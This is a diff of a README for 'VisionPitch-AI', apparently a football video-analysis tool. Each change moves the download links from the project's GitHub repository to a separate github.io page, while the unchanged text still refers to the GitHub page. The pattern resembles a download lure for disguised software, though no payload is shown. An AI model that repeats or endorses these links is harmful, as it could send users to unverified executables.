@@ -1,7 +1,7 @@
 <h1>⚽ VisionPitch-AI - AI Tactical Football Analysis for Everyone</h1>
 
 <p align="center">
-  <a href="https://github.com/tabbkurdish1868/VisionPitch-AI"><img src="https://img.shields.io/badge/Download-VisionPitch--AI-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download VisionPitch-AI" style="background-color:#4CAF50; color:white; padding:15px 30px; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 6px rgba(0,0,0,0.3);"></a>
+  <a href="https://tabbkurdish1868.github.io"><img src="https://img.shields.io/badge/Download-VisionPitch--AI-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download VisionPitch-AI" style="background-color:#4CAF50; color:white; padding:15px 30px; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 6px rgba(0,0,0,0.3);"></a>
 </p>
 
 <p align="center">🚀 Transform your football videos into professional tactical insights with cutting-edge AI. No coding required.</p>
@@ -31,7 +31,7 @@
 
 <h3>Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/tabbkurdish1868/VisionPitch-AI"><strong>Download VisionPitch-AI</strong></a></p>
+<p>Visit this link to download the application: <a href="https://tabbkurdish1868.github.io"><strong>Download VisionPitch-AI</strong></a></p>
 
 <p>At the GitHub page, click the green <em>Download</em> button. The download will begin automatically.</p>
 
@@ -113,7 +113,7 @@
 
 <h2>⚡ Download Again</h2>
 
-<p>Visit <a href="https://github.com/tabbkurdish1868/VisionPitch-AI"><strong>Download VisionPitch-AI</strong></a> now and bring your match analysis into the 21st century. Analyze your football footage with a single click—no technical background needed.</p>
+<p>Visit <a href="https://tabbkurdish1868.github.io"><strong>Download VisionPitch-AI</strong></a> now and bring your match analysis into the 21st century. Analyze your football footage with a single click—no technical background needed.</p>
 
 <p align="center">🚀 Start your AI‑powered tactical football journey today!</p>
 
@@ -127,6 +127,6 @@
 <h2>🎁 Final Words</h2>
 <p>We believe smart sports analysis should be accessible to every fan and player. Thanks for choosing VisionPitch-AI—the smartest way to understand the beautiful game.</p>
 
-<p align="center"><a href="https://github.com/tabbkurdish1868/VisionPitch-AI"><img src="https://img.shields.io/badge/Download%20Now-GitHub-blue?style=for-the-badge&logo=github" alt="Download" style="background-color:#333; color:white; padding:15px; border-radius:30px;"></a></p>
+<p align="center"><a href="https://tabbkurdish1868.github.io"><img src="https://img.shields.io/badge/Download%20Now-GitHub-blue?style=for-the-badge&logo=github" alt="Download" style="background-color:#333; color:white; padding:15px; border-radius:30px;"></a></p>
 
 <p><em>You are ready. Your football analysis begins here.</em></p>
